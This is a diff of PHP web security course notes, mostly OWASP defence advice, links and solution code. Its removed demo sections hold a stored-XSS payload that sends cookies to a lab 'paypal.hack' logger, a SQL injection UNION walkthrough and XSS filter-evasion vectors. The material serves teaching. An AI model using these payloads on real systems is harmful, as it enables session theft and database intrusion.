@@ -12,9 +12,30 @@ NOTE: some of the links are dated as these notes represent 9 years of teaching P
   * Lab: Brute Force / ZAP Tool
   * Lab: XSS
   * Lab: Insecure Direct Object References
+
+## ERRATA
+* VM
+  * See this message when running CLI: `PHP Warning: PHP Startup: Unable to load dynamic library 'libsodium.so'`
+    * The `Sodium` PHP extension, which uses `libsodium.so`, is now standard as of PHP 7.1
+    * It was introduced as an alternative to OpenSSL and serves to fill the void left by the removal of the `mcrypt` extension
+    * Run this command: `php -i |less`
+    * Look for `Loaded Configuration File => /path/to/php.ini`
+    * Edit `/path/to/php.ini` (path as noted above)
+    * Search for (probably at the end) and remove the line `extension=libsodium.so`
+* Lab: XSS
+    * refs to "xss_r" need to be changed to "xssr"
+    * refs to "xss_s" need to be changed to "xsss"
+    * Tidy Extension Lab:
+        * Open `/securitytraining/vulnerabilities/xssr/tools/tidy/index.php`
+        * Change any references from `xss_r` to `xssr`
+        * Remove the line `extension=libsodium.so` (if it exists) on the CLI php.ini file (see notes on VM above)
+        * Hit `F5` to run the example
+
 ### Other Notes
+* Q: How do I figure out the size of my "attack surface"?
+  * A: There is a good set of guidelines on owasp.org here: https://www.owasp.org/index.php/Attack_Surface_Analysis_Cheat_Sheet
 * Q: Brute force detector lab setup?
-* A: Need to create a table "bfdetect"
+  * A: Need to create a table "bfdetect"
 ```
 CREATE TABLE `bfdetect` (
   `id` bigint(3) unsigned NOT NULL auto_increment,
@@ -56,14 +77,20 @@ DEMO: nmap -A -T4 ip.add.re.ss
 * Insecure Direct Obj Refs
   * https://www.sec-consult.com/en/blog/advisories/insecure-direct-object-reference-in-testlink-open-source-test-management/index.html
 * CSRF
-  * https://nvd.nist.gov/vuln/detail/CVE-2018-7307#vulnCurrentDescriptionTitle
+  * https://www.cvedetails.com/cve/CVE-2018-10267/
+  * WordPress Plugin (again): https://www.cvedetails.com/cve/CVE-2018-10233/
 * Security Misconfig
     * https://www.databreaches.net/samba-federal-employee-benefit-association-programming-error-resulted-in-mismailed-information/
     * http://arstechnica.com/security/2016/05/faulty-https-settings-leave-dozens-of-visa-sites-vulnerable-to-forgery-attacks/
 * Sensitive Data Exp
+  * https://www.nytimes.com/2017/09/07/business/equifax-cyberattack.html
 * Missing Function Level Access Control
+  * https://www.symantec.com/security-center/vulnerabilities/writeup/103638
 * Using Open Source w/ Known Vulnerabilities
+  * https://www.cvedetails.com/
 * Invalidated Redirects and Forwards
+  * https://www.indusface.com/blog/google-vulnerable-open-redirect/
+  * https://www.securityfocus.com/bid/82463/discuss
 
 ## PENETRATION TESTING TOOLS
 * Zed Attack Proxy Tool
@@ -95,7 +122,7 @@ LAB: solution should use prepared statements!!!
     -- Ask a security question
 * 6: Consider resetting the password + use out-of-band notification (i.e. email)
 * 7: if a high level of abuse is noted, extreme measures are called for: i.e. total lockout at IP level
-
+* 8: Generate random temporary redirect pages if excessive failed logins are detected.  Add random ipsum lorem to the temporary pages to further confuse automated attack systems.
 
 ## XSS:
 * 1: escape, validate, filter all input
@@ -113,8 +140,6 @@ LAB: solution should use prepared statements!!!
 * 7: Use Zend\Escaper\HtmlAttrib (???) which escapes *contents* of attribs
 * 8: from Keoghan to All Participants: just thought I'd share this for the times where html is needed to be allowed through:
     https://github.com/ezyang/htmlpurifier (not sure if everyone will have some across it or not)
-
-LAB NOTE: solution for XSS_R s/be $_POST not $_GET
 
 ## Insecure Direct Object Reference / Missing Function Level Access Control
 * 1: When building the SELECT, encrypt the database key which is exposed to the form
@@ -155,6 +180,9 @@ LAB: quick test: download form, make a change, submit manually, and see that you
     look for ssl_module especially
 * 6: php.ini settings: allow_url_include = off; open_basedir = /set/this/to/something; doc_root = /set/to/something
 
+## Unvalidated Redirects and Forwards
+* Also called "Unauthorized Redirects" or "Open Redirects"
+
 ## Insufficient Crypto Handling of Sensitive Data
 * 1: Don't use old/weak crypto methods (i.e. md5 or sha1)
 * 2: Need to determine what is "sensitive data" for your app
@@ -184,7 +212,7 @@ LAB: quick test: download form, make a change, submit manually, and see that you
 -- UC Berkeley Study
 -- Technical + Business Impact of Successful SQL Injection Attacks
 
-## LATEST THREATS:
+## THREATS:
 * https://www.hackmageddon.com/2018/04/06/february-2018-cyber-attacks-statistics/
 * https://www.itgovernance.co.uk/blog/list-of-data-breaches-and-cyber-attacks-in-march-2018/
 * http://researchcenter.paloaltonetworks.com/2017/04/unit42-new-iotlinux-malware-targets-dvrs-forms-botnet/
@@ -220,7 +248,7 @@ LAB: quick test: download form, make a change, submit manually, and see that you
 * http://phpsec.org/projects/guide/4.html
 * https://info.whitehatsec.com/rs/whitehatsecurity/images/2015-Stats-Report.pdf
 
-## LATEST ATTACKS:
+## ATTACKS:
 * http://arstechnica.com/security/2016/06/how-linkedins-password-sloppiness-hurts-us-all/
 * http://arstechnica.com/security/2016/06/teamviewer-users-are-being-hacked-in-bulk-and-we-still-dont-know-how/
 * http://arstechnica.com/security/2016/06/10000-wordpress-sites-imperilled-by-in-the-wild-mobile-plugin-exploit/
@@ -275,7 +303,7 @@ LAB: quick test: download form, make a change, submit manually, and see that you
 * https://panopticlick.eff.org/
 * https://www.torproject.org/
 
-## LATEST SECURITY THREATS:
+## SECURITY THREATS:
 * http://www.net-security.org/secworld.php?id=18087
 * http://www.ponemon.org/blog/ponemon-institute-releases-2014-cost-of-data-breach-global-analysis
 * http://www.darkreading.com/travel-agency-fined--gb-pound-150000-for-violating-data-protection-act/d/d-id/1297538?
@@ -417,394 +445,15 @@ OWASP Security Tutorial Series:
 * http://phpsec.org/projects/guide/2.html
 * http://stackoverflow.com/questions/3012315/php-security-best-practices
 
-Topic: Building Security into Your PHP Applications
-* http://www.zend.com/webinar/Framework/70170000000bEs9-webinar-secure-application-development-with-the-ZF-20100505.flv
-
-
--- 01 ------------------------------
-Intro
-Ask students horror stories + experience level
-Discuss VM
-Tell them to start looking at it in preparation for Thursday
-
--- 03 ------------------------------
-White Hat 11th Website Security Stats
-(see PDF file)
-
--- 04 ------------------------------
-Should be "avoid" not 'avid'
-
--- 05 ------------------------------
-http://www.owasp.org/index.php/Defense_in_depth
-http://blogs.techrepublic.com.com/security/?p=703
-
--- 06 ------------------------------
-Questions for Class:
-* Q: What is the difference between filtering and validation?
-* A: Filtering => returns changed / sanitized data
-   Validation => returns T or F
-* Q: Why are HTTP headers considered insecure?  Aren't they automatically generated?
-* A: DEMO: Firebug + Tamper Data
-http://www.php.net/manual/en/security.php
-https://www.owasp.org/index.php/PHP_Top_5
-
--- 07 ------------------------------
-Examples: check country codes against list; verify postal codes; etc.
-DEMO: register_globals in debug
-DEMO: register_long_arrays (NOTE: deprecated in PHP 5.3)
-REF: http://www.php.net/manual/en/ini.core.php#ini.register-long-arrays
-DEMO: E_ALL error reporting
-Permissions: discuss using Apache user www-data and group instead of chmod 777
-
--- 08 ------------------------------
-Cookies:
-Hack: <script>alert(document.cookie)</script>
-May be difficult to check host: ISPs use DHCP so address changes
-Might be able to do a check by date/time: check to see how old cookie is
-Store a token which includes timestamp
-Errors:
-        Development     Production
-display_errors  on          off
-log_errors  on          on
-Use try {} catch {} or if / then in production
-Display non-specific error messages -- i.e. give them basic info and then a code useful to you
-Error log file: should be outside document root
-Notice:
-Also note that file is below document root (htdocs)
-Not processed by php engine = accessible
-
-DEMO: http://insecurebb/xxx
-DEMO: http://ci.santa-rosa.ca.us/departments/finance/revenue/businesstax/Pages/BusinessTaxRenewal.aspx
-DEMO: http://www.thamesriverservices.co.uk/timetable_winter.cfm
-
--- 09 ------------------------------
-Mention tools such as tamper data, or view source, cut and paste, run form locally
-DEMO: http://localhost/php_sec/encrypted_streams_example.php
-DEMO: http://localhost/php_sec/blowfish_example.php
-
--- 10 ------------------------------
-Possible solutions:
-use .htaccess file
-
--- 11 ------------------------------
-File w/ phpinfo(): remove or rename it (security by obscurity)
-Sensitive downloadable files could be stored in a dir outside of document root
-Write demo app which checks authentication, and then grants access to dir outside of document root
-Show that web users can't get to that directory from browser
-Write demo app which uses http_referer & then use tamper data to spoof it (use paypal.com as an example)
-Open Source:
-When you first install Joomla, and go to the site, it immediately launches the install.  Make sure you perform the install RIGHT AWAY.  Don't install it and then do the install the next day!!!  Same goes for Drupal.
-Both Joomla and Drupal default to the admin user = "admin".  Change that.
-
-DEMO:
-1.  Unzip joomla from /var/www/joomla
-2.  Go to http://localhost/joomla
-3.  Point out that it's now unsecure / vulnerable
-
-DEMO:
-1.  Go to http://phpmyadmin/setup/
-2.  Make sure you secure or remove the setup directory!!!
-
--- 12 ------------------------------
-NOTE: Sandboxes (as used here) are also called "honeypots"
-Project Honeypot: http://projecthoneypot.org/
-Lookup IP Addresses: http://www.ripe.net/
-
--- 14 ------------------------------
-Show the White Hat Security Top Ten June 2012:
-http://www.slideshare.net/jeremiahgrossman/stat-swebinar062712
-
--- 15 ------------------------------
-http://www.slideshare.net/billkarwin/sql-injection-myths-and-fallacies [esp slide 50]
-http://www.lfpress.com/news/london/2010/10/22/15797971.html#/news/london/2010/10/22/pf-15794376.html
-http://www.marketwire.com/press-release/Cenzic-Releases-Top-Five-Web-Vulnerabilities-for-September-1339007.htm
-http://www.securiteam.com/securityreviews/5DP0N1P76E.html -- SQL Injection walkthrough
-
-SQL HACKING DEMO IN VM:
-0. Locate the sqlite database file and make it R/W:
-   /workspace/InsecureBB/application/default/data/insecurebb
-1. Create a user account "joe"
-2. Go to login screen
-3. In username field enter: joe' union select 1 from test --
-4. Note the error.  Now we know it's sqlite.  Master table = "sqlite_master"
-5. In username field enter: joe' union select 1 from sqlite_master --
-6. Note the error.  Keep filling in fields (i.e. 1,2 ... 1,2,3 ... etc.) until error goes away.
-   Now you know the correct syntax for the "union" statement and can hack from there.
-
-c297f83139203007287966856136c6ba
-
--- 16 ------------------------------
-Obfuscated SQL injection attack example:
-Google '<iframe src="hxxp://nemohuildiin.ru' to get an idea of web pages infected by this!
-
-http://www.troyhunt.com/2013/07/everything-you-wanted-to-know-about-sql.html
-
--- 18 ------------------------------
-addslashes()
-Returns a string with backslashes before characters that need to be quoted in database queries etc.
-These characters are single quote ('), double quote ("), backslash (\) and NUL (the NULL byte).
-http://us.php.net/manual/en/function.addslashes.php
-http://shiflett.org/blog/2006/jan/addslashes-versus-mysql-real-escape-string
-https://www.owasp.org/index.php/SQL_Injection_Prevention_Cheat_Sheet
-
-Class Exercise:
-SHOW: bad_db_select.php
-ASK:  How to fix it?
-SHOW: bad_db_pdo_select_fixed.php
-
--- 19 ------------------------------
-XSS = #1 form of attack right now
-* Stored XSS Attacks
-Stored attacks are those where the injected code is permanently stored on the target servers, such as in a database, in a message forum, visitor log, comment field, etc. The victim then retrieves the malicious script from the server when it requests the stored information.
-* Reflected XSS Attacks
-Reflected attacks are those where the injected code is reflected off the web server, such as in an error message, search result, or any other response that includes some or all of the input sent to the server as part of the request. Reflected attacks are delivered to victims via another route, such as in an e-mail message, or on some other web server. When a user is tricked into clicking on a malicious link or submitting a specially crafted form, the injected code travels to the vulnerable web server, which reflects the attack back to the user’s browser. The browser then executes the code because it came from a "trusted" server.
-http://www.owasp.org/index.php/Cross-site_Scripting_(XSS)
-http://www.cgisecurity.com/xss-faq.html
-Prevention:
-http://www.ibm.com/developerworks/web/library/wa-secxss/
-
--- 21 ------------------------------
-XSS "Cheat Sheet"
-https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet
-http://ha.ckers.org/
-
-Show Tamper Data Options
-Show fake WF email + screenshot of hacker site
-
-DEMO 1:
-1.  Show fake paypal email
-2.  Click on link
-3.  "Login"
-4.  Show extended link
-
-DEMO 2:
-Inside VM:
-1.  inject into insecurebb posting:
-Are your cookies really safe?<div style="visibility:hidden;"><img name="x" src="default.png"><script>document.x.src="http://192.168.102.1/paypal.hack/logger.php?info=TEST-"+document.cookie;</script></div>
-From 192.168.102.1
-2.  Show contents of /var/www/paypal.hack/logger.php
-3.  Show contents of /var/www/paypal.hack/info.log
-4.  View the posting
-5.  Show contents of /var/www/paypal.hack/info.log
-
--- 22 ------------------------------
-Blacklist approach: hackers use new domains all the time
-DEMO: filter_and_validate.php
-DEMO: zend_filter_email.php
-http://www.phpclasses.org/browse/package/2189.html (class.inputfilter.php)
-Zend_Filter: http://framework.zend.com/manual/en/zend.filter.html
-Zend_Validate: http://framework.zend.com/manual/en/zend.validate.html
-PEAR Validate Package: http://pear.php.net/manual/en/package.validate.validate.php
-(NOTE: supports international features.  I.e. the UK package includes sort codes, the AU package includes the Tax File Number, etc.)
-
-Filtering Libraries:
-http://www.php.net/manual/en/function.filter-var.php
-http://php.net/manual/en/book.filter.php
-
-Escaping:
-htmlspecialchars()
-htmlentities()
-Database quoting
-
-PEAR packages:
-http://pear.php.net/package/HTML_Safe
-
--- 23 ------------------------------
-SHOW: basic_hack.php
-ASK:  How would you fix this?
-
--- 24 ------------------------------
-Semi-colon is not required, but is good programming practice
-Demo $_SERVER['PHP_SELF'] (or use phpinfo(INFO_VARIABLES) )
-Demo http://localhost/foo.php"><script>alert('Hi')</script><"
-(URL encode the above)
-User accesses site as :
-Solution: use echo htmlspecialchars($_SERVER... etc.)
-www.securityfocus.com/bid/15248/info
-* Q: Why is PHP_SELF considered dangerous?  Isn't it generated by the server?
-* A: http://markjaquith.wordpress.com/2009/09/21/php-server-vars-not-safe-in-forms-or-links/
-* A: http://php.net/manual/en/reserved.variables.server.php
-* A: http://www.phpfreaks.com/forums/index.php?topic=323392.0
-* A: Also note that this is straight out XSS which can do limited damage.  Nevertheless, it is an open attack vector
-   which allows the attacker to probe your website.
-
--- 25 ------------------------------
-Go through example in student PDF appendix
-Also show Tidy docs examples
-DEMO: tidy_example.php
-
--- 27 ------------------------------
-rm -Rf (?)
-No reason for using exec: could use glob() instead
-
--- 28 ------------------------------
-DEMO: escapeshellarg_escapeshellcmd.php
-php.ini has parameters to disable functions and/or classes:
-disable_functions = function_name1,function_name2,function_name3,etc.
-disable_classes = class_name1,class_name2,class_name3,etc.
-
--- 31 ------------------------------
-Demo this hack
-http://pear.php.net/package/Services_ReCaptcha
-http://pear.php.net/package/HTML_QuickForm_CAPTCHA
-
--- 31 ------------------------------
-How to prevent this:
-(A) test $num to make sure it's a number (i.e. ctype_digit)
-(B) (int) $num
-
--- 33 ------------------------------
-Guard against:
-(A) use $_POST instead of $_GET
-(B) use a prepared statement
-(C) validate password
-(D) screen for SQL comments, quotes, etc.
-
-
--- 34 ------------------------------
-(A) need to validate input: could have SQL errors show up
-
--- 35 ------------------------------
-(A) $_REQUEST is dangerous: somebody could add a parameter to the URL = $_GET
-(B) Demo where username = "<script>alert('Hi')</script>"
-
--- 36 ------------------------------
-MySpace SAMY Worm Hack
-http://namb.la/popular/
-
-This is a classic example of a CRSF attack:
-1. Hacker posted malicious code to his own MySpace page using javascript hidden in <div> tags.  He hid "javascript" from the MySpace filter by using "java\nscript".
-2. When an innocent user clicked on this part of his page, the code used the user's logged in credentials to automatically add Samy to their "friend" and "hero" list.
-3. The code was then replicated on the innocent user's page.  When their own friends clicked on this part of the page, they, in turn added Samy to their friends list.
-NOTE: In this case the "3rd party site" = Samy's MySpace page and the Victim Site = the user's MySpace page.
-etc. etc.
-
-Contrast XSS with CSRF (slide 38)
-http://en.wikipedia.org/wiki/Cross-site_request_forgery
-Related: Confused Deputy Problem, Replay Attack, Session Fixation
-A confused deputy is a computer program that is innocently fooled by some other party into misusing its authority. It is a specific type of privilege escalation. In information security, the confused deputy problem is often cited as an example of why capability-based security is important.
-A cross-site request forgery (CSRF) is an example of a confused deputy attack against a web browser. In this case a client's web browser has no means to distinguish the authority of the client from any authority of a "cross" site that the client is accessing.
-
-A replay attack is a form of network attack in which a valid data transmission is maliciously or fraudulently repeated or delayed. This is carried out either by the originator or by an adversary who intercepts the data and retransmits it, possibly as part of a masquerade attack by IP packet substitution (such as stream cipher attack).
-
-CSRF FAQ
-http://www.cgisecurity.com/csrf-faq.html
-Google Gmail CSRF Hack
-http://directwebremoting.org/blog/joe/2007/01/01/csrf_attacks_or_how_to_avoid_exposing_your_gmail_contacts.html
-
--- 39 ------------------------------
-Note: the HTML for the 3rd party site has been hacked
-Hacker used an <img> tag to send info to the victim site (?)
-
--- 40 ------------------------------
-Protection: stamp form requests with some sort of token or session ID
-
--- 41 ------------------------------
-Session Hijacking: where user fails to logout from a sensitive site, then the janitor gets onto their computer or the hacker has injected javascript which reads cookies and sends it to an "evil" site or a packet sniffer on the network captures this info
-
-Session Fixation: often used for digital downloads -- customer gets unique URL
-In computer network security, session fixation attacks attempt to exploit the vulnerability of a system which allows one person to fixate (set) another person's session identifier (SID). Most session fixation attacks are web based, and most rely on session identifiers being accepted from URLs (query string) or POST data.
-
-Used especially in sites where user is "logged in all the time" or where there is a "remember me" function (usually = session info stored in cookie)
-
--- 43 ------------------------------
-See "bad_cookie_fixed.php"
-
--- 44 ------------------------------
-Demo file upload and show phpinfo() data for $_FILES
-File MIME type forged (?)
-CHECKING MIME TYPE MIGHT NOT BE ENOUGH!
-
-DEMO:
-
-1.  cd /var/www/php_sec
-2.  hd hacked.jpg
-3.  Notice javascript embedded at end of jpg
-4.  Demo how file comes up OK in browser and appears to be a normal jpg
-
--- 45 ------------------------------
-Potential command injection attack
-Check php.ini and make sure tmp upload directory is outside of document root
-Instead of file_exists(), use is_uploaded_file()
-$cmp_name relies on user supplied filename = should not be trusted
-
--- 47 ------------------------------
-session_regenerate_id --> need to add TRUE to make sure old session is removed
-DEMO: session_regenerate_id.php
-
--- 49 ------------------------------
-php.net/manual/en/features.safe-mode.functions.php
-NOTE: Safe Mode is deprecated
-(see http://www.breakingpointsystems.com/community/blog/php-safe-mode-considered-harmful/)
-open_basedir = /xxx
-REF: http://www.php.net/manual/en/ini.core.php#ini.open-basedir
-register_long_arrays -- deprecated in PHP 5.3
-REF: http://www.php.net/manual/en/ini.core.php#ini.register-long-arrays
-
--- 51 ------------------------------
-In this context: not like test environment (i.e. PayPal developer's sandbox)
-Area which is attractive to attackers
-Used to gather data on attacker
-
--- 52 ------------------------------
-Tarpits -- Wells Fargo used to use that technique
-Works in asynchronous apps (i.e. email)
-http://projecthoneypot.org/
-
--- 53 ------------------------------
-Can be effective if part of a larger strategy
-Another layer in the onion
-
--- 54 ------------------------------
-Ajax definition:
-A method by which asynchronous calls are made to web servers without causing a full refresh of the webpage. This kind of interaction is made possible by three different components: a client-side scripting language, the XmlHttpRequest (XHR) object and XML.
-Developers have found many uses for Ajax such as "suggestive" textboxes (such as Google Suggest) and auto-refreshing data lists.
-Security Implications:
-* Client side security controls can be easily compromised
-* Increases "attack surface"
-* Gap between users and services shortened = less room for validation, etc.
-* Increased exposure to XSS attacks
-    * e.g. SQL statements, table and column names, are exposed
-AJAX complicates security testing
-* The page "state" is no longer well defined
-* Async nature means testing may not catch requests initiated through timer events
-* Test tools may not be geared to test transmitted XML data and may not be
-  designed to parse and/or execute and test javascript
-http://www.securityfocus.com/infocus/1868
-http://www.acunetix.com/websitesecurity/ajax.htm
-
-DEMO: use Wireshark to test AJAX transfer w/ Google word completion
-
--- 55 ------------------------------
-https://www.owasp.org/index.php/OWASP_AJAX_Security_Guidelines
-http://net-square.com/whitepapers/Top_10_Ajax_SH_v1.1.pdf
-
--- 57 ------------------------------
-From: http://ha.ckers.org/xss.html
-fromCharCode (if no quotes of any kind are allowed you can eval() a fromCharCode in JavaScript to create any XSS vector you need).
-
-Example:
-<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>
-UTF-8 Unicode encoding (all of the XSS examples that use a javascript: directive inside of an <IMG tag will not work in Firefox or Netscape 8.1+ in the Gecko rendering engine mode). Use the XSS calculator for more information:
-
-Example:
-<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>
-
-Vulnerabilities of PHP to multibyte encoding:
-REF: http://www.phpwact.org/php/i18n/utf-8
-
-Demo: tag_test.html
-
--- 59 ------------------------------
-Also:
-Gen Security Tools: http://sectools.org/
-Untangle: http://www.untangle.com/
-Snort: http://www.snort.org/
-nmap: http://nmap.org/
-iptables rules generator: http://easyfwgen.morizot.net/gen/
-Arachni: http://arachni.segfault.gr/ (web app security scanner)
-Joomla: https://lists.owasp.org/mailman/listinfo/owasp-joomla-vulnerability-scanner
-PHP: http://pear.php.net/package/PHP_CodeSniffer
+## SECURITY TOOLS
+* http://sectools.org/
+* Untangle: http://www.untangle.com/
+* Snort: http://www.snort.org/
+* nmap: http://nmap.org/
+* iptables rules generator: http://easyfwgen.morizot.net/gen/
+* Arachni: http://arachni.segfault.gr/ (web app security scanner)
+* Joomla: https://lists.owasp.org/mailman/listinfo/owasp-joomla-vulnerability-scanner
+* PHP: http://pear.php.net/package/PHP_CodeSniffer
 
 DEMO:
 Checking a file with PHP_CodeSniffer
@@ -824,22 +473,7 @@ DEMO: nmap -A -T4 172.16.82.1
 DEMO: wireshark packet capture
 DEMO: logwatch
 
-IE Tools:
-http://portswigger.net/burp/proxy.html
-http://blogs.msdn.com/b/ie/archive/2008/09/03/developer-tools-in-internet-explorer-8-beta-2.aspx
-http://msdn.microsoft.com/en-us/ie/aa740478
-
-Chrome:
-http://code.google.com/chrome/devtools/docs/overview.html
-
-Encryption:
-REF: http://www.zend.com/en/webinar/PHP/70170000000bWL2-strong-cryptographie-20110630.flv
-
-After module 4, use the VM to figure out where insecurities lie
-Are your cookies really safe?<div style="visibility:hidden;"><img name="x" src="default.png"><script>document.x.src="http://paypal.hack/logger.php?info="+document.cookie;alert("I guess not!");</script></div>
-
-
-Q & A:
+## Q & A:
 
 * Q: Can you address how to protect from hacked images like that jpeg?
 * A: jpegs infected with a virus are not a danger unless they area "executed" directly by the OS.
@@ -894,8 +528,9 @@ Owasp.org tools page
    See: https://en.wikipedia.org/wiki/Botnet
 
 
-CLASS CODE EXAMPLES
+## CLASS CODE EXAMPLES
 
+```
 // xss stored solution
 <?php
 
@@ -927,7 +562,9 @@ if(isset($_POST['btnSign']))
       echo 'No results found';
    }
 }
+```
 
+```
 // CSRF solution
 <?php
 /**
@@ -1011,7 +648,9 @@ if (isset($_POST['Change'])) {
             <br /><br /><input type=\"submit\" value=\"Change\" name=\"Change\">
         </form>";
 }
+```
 
+```
 // insecure configuration lab
 <?php
 
@@ -1059,7 +698,9 @@ if (!empty($_POST['username']) && !empty($_POST['password'])) {
           </div>
          </div>";
 }
+```
 
+```
 // secure file upload
 <?php
 // TODO: redefine / override the php.ini setting for tmp files
@@ -1156,7 +797,4 @@ phpinfo(INFO_VARIABLES);
 ?>
 </body>
 </html>
-
-
-
-
+```
